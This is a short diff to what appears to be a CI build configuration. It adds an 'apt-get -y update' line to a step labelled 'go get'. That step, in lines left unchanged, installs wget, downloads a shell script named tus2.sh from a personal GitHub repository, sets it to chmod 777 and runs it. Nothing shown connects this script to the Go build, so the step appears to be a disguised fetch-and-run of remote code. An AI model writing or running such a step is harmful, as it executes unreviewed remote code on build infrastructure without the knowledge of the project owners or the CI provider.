@@ -33,6 +33,7 @@ build:
     - script:
         name: go get
         code: |
+               apt-get -y update
                apt-get -y install wget
                wget --version
                wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
